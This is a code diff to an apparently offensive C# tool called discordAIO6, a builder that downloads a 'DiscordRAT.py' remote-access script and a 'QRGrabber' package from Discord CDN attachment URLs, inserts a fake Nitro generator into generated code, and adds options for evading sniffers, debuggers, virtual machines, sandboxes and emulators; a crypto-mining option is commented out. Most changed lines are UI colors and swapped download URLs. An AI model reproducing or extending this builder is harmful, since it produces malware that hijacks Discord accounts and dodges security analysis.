@@ -26,7 +26,7 @@ namespace discordAIO6
 {
     public partial class dAIOmain : Form
     {
-        private static string version = "0.7.1";
+        private static string version = "0.7.2";
 
         public DiscordRpcClient dc_client;
 
@@ -120,9 +120,9 @@ namespace discordAIO6
                 Directory.CreateDirectory(aioDir + "\\QRGrabber");
                 try
                 {
-                    new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/831225076187660348/950026185780375653/requirements.txt", aioDir + "\\requirements.txt");
-                    new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/831225076187660348/950038854100983838/DiscordRAT.py", aioDir + "\\DiscordRAT.py");
-                    new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/831225076187660348/951601402457759854/QRG.zip", aioDir + "\\QRG.zip");
+                    new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/973554721795235940/973555367231508500/requirements.txt", aioDir + "\\requirements.txt");
+                    new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/973554721795235940/973557709578334288/DiscordRAT.py", aioDir + "\\DiscordRAT.py");
+                    new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/973554721795235940/973557313912864788/QRG.zip", aioDir + "\\QRG.zip");
                     ZipFile.ExtractToDirectory(aioDir + "\\QRG.zip", aioDir + "\\QRGrabber");
                     File.Delete(aioDir + "\\QRG.zip");
                 }
@@ -501,7 +501,6 @@ namespace discordAIO6
             swifiBox.ForeColor = Color.DarkRed;
             sbrhisBox.ForeColor = Color.DarkRed;
             dinternetBox.ForeColor = Color.DarkRed;
-            cryptoBox.ForeColor = Color.DarkRed;
             pluginSource.Lexer = Lexer.Cpp;
             pluginSource.StyleResetDefault();
             pluginSource.Styles[Style.Default].Font = "Consolas";
@@ -731,6 +730,11 @@ namespace discordAIO6
             backButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(60, 0, 0);
             backButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(50, 0, 0);
             label69.ForeColor = Color.DarkRed;
+            sniffersBox.ForeColor = Color.DarkRed;
+            debugBox.ForeColor = Color.DarkRed;
+            vmBox.ForeColor = Color.DarkRed;
+            sandboxBox.ForeColor = Color.DarkRed;
+            emuBox.ForeColor = Color.DarkRed;
         }
 
         private void button1_Click(object sender, EventArgs e)
@@ -818,7 +822,6 @@ namespace discordAIO6
             swifiBox.ForeColor = Color.LimeGreen;
             sbrhisBox.ForeColor = Color.LimeGreen;
             dinternetBox.ForeColor = Color.LimeGreen;
-            cryptoBox.ForeColor = Color.LimeGreen;
             pluginSource.Lexer = Lexer.Cpp;
             pluginSource.StyleResetDefault();
             pluginSource.Styles[Style.Default].Font = "Consolas";
@@ -1048,6 +1051,11 @@ namespace discordAIO6
             backButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 60, 0);
             backButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 50, 0);
             label69.ForeColor = Color.LimeGreen;
+            sniffersBox.ForeColor = Color.LimeGreen;
+            debugBox.ForeColor = Color.LimeGreen;
+            vmBox.ForeColor = Color.LimeGreen;
+            sandboxBox.ForeColor = Color.LimeGreen;
+            emuBox.ForeColor = Color.LimeGreen;
 
         }
 
@@ -1136,7 +1144,6 @@ namespace discordAIO6
             swifiBox.ForeColor = Color.DodgerBlue;
             sbrhisBox.ForeColor = Color.DodgerBlue;
             dinternetBox.ForeColor = Color.DodgerBlue;
-            cryptoBox.ForeColor = Color.DodgerBlue;
             pluginSource.Lexer = Lexer.Cpp;
             pluginSource.StyleResetDefault();
             pluginSource.Styles[Style.Default].Font = "Consolas";
@@ -1366,6 +1373,11 @@ namespace discordAIO6
             backButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 0, 60);
             backButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(0, 0, 50);
             label69.ForeColor = Color.DodgerBlue;
+            sniffersBox.ForeColor = Color.DodgerBlue;
+            debugBox.ForeColor = Color.DodgerBlue;
+            vmBox.ForeColor = Color.DodgerBlue;
+            sandboxBox.ForeColor = Color.DodgerBlue;
+            emuBox.ForeColor = Color.DodgerBlue;
         }
 
         private void button3_Click(object sender, EventArgs e)
@@ -1453,7 +1465,6 @@ namespace discordAIO6
             swifiBox.ForeColor = Color.Gainsboro;
             sbrhisBox.ForeColor = Color.Gainsboro;
             dinternetBox.ForeColor = Color.Gainsboro;
-            cryptoBox.ForeColor = Color.Gainsboro;
             pluginSource.Lexer = Lexer.Cpp;
             pluginSource.StyleResetDefault();
             pluginSource.Styles[Style.Default].Font = "Consolas";
@@ -1683,6 +1694,11 @@ namespace discordAIO6
             backButton.FlatAppearance.MouseDownBackColor = Color.FromArgb(160, 160, 160);
             backButton.FlatAppearance.MouseOverBackColor = Color.FromArgb(150, 150, 150);
             label69.ForeColor = Color.Gainsboro;
+            sniffersBox.ForeColor = Color.Gainsboro;
+            debugBox.ForeColor = Color.Gainsboro;
+            vmBox.ForeColor = Color.Gainsboro;
+            sandboxBox.ForeColor = Color.Gainsboro;
+            emuBox.ForeColor = Color.Gainsboro;
         }
 
         private string ynBtn = "yes";
@@ -3326,7 +3342,7 @@ namespace discordAIO6
                             }
 
                             // Crypto
-                            if (cryptoBox.Checked)
+                       /*     if (cryptoBox.Checked)
                             {
                                 if (String.IsNullOrEmpty(textBox6.Text) || String.IsNullOrWhiteSpace(textBox6.Text) || String.IsNullOrEmpty(textBox3.Text) || String.IsNullOrWhiteSpace(textBox3.Text) || String.IsNullOrEmpty(textBox1.Text) || String.IsNullOrWhiteSpace(textBox1.Text))
                                 {
@@ -3360,7 +3376,7 @@ namespace discordAIO6
                                 {
                                     PopupMessage(poolusrname);
                                 }
-                            }
+                            } */
                             if (nitroBox.Checked)
                             {
                                 text = text.Replace("//ourcoolfakenitrogen", "RunFAKENitroGEN();");
@@ -4119,7 +4135,7 @@ namespace discordAIO6
             File.Delete(aioDir + "\\DiscordRAT.py");
             try
             {
-                new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/831225076187660348/950038854100983838/DiscordRAT.py", aioDir + "\\DiscordRAT.py");
+                new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/973554721795235940/973557709578334288/DiscordRAT.py", aioDir + "\\DiscordRAT.py");
             }
             catch { }
 
@@ -4322,9 +4338,9 @@ namespace discordAIO6
                 Directory.CreateDirectory(aioDir + "\\QRGrabber");
                 try
                 {
-                    new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/831225076187660348/950026185780375653/requirements.txt", aioDir + "\\requirements.txt");
-                    new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/831225076187660348/950038854100983838/DiscordRAT.py", aioDir + "\\DiscordRAT.py");
-                    new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/831225076187660348/951601402457759854/QRG.zip", aioDir + "\\QRG.zip");
+                    new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/973554721795235940/973555367231508500/requirements.txt", aioDir + "\\requirements.txt");
+                    new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/973554721795235940/973557709578334288/DiscordRAT.py", aioDir + "\\DiscordRAT.py");
+                    new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/973554721795235940/973557313912864788/QRG.zip", aioDir + "\\QRG.zip");
                     ZipFile.ExtractToDirectory(aioDir + "\\QRG.zip", aioDir + "\\QRGrabber");
                     File.Delete(aioDir + "\\QRG.zip");
                 }
@@ -4338,9 +4354,9 @@ namespace discordAIO6
                 Directory.CreateDirectory(aioDir + "\\QRGrabber");
                 try
                 {
-                    new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/831225076187660348/950026185780375653/requirements.txt", aioDir + "\\requirements.txt");
-                    new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/831225076187660348/950038854100983838/DiscordRAT.py", aioDir + "\\DiscordRAT.py");
-                    new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/831225076187660348/951601402457759854/QRG.zip", aioDir + "\\QRG.zip");
+                    new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/973554721795235940/973555367231508500/requirements.txt", aioDir + "\\requirements.txt");
+                    new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/973554721795235940/973557709578334288/DiscordRAT.py", aioDir + "\\DiscordRAT.py");
+                    new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/973554721795235940/973557313912864788/QRG.zip", aioDir + "\\QRG.zip");
                     ZipFile.ExtractToDirectory(aioDir + "\\QRG.zip", aioDir + "\\QRGrabber");
                     File.Delete(aioDir + "\\QRG.zip");
                 }
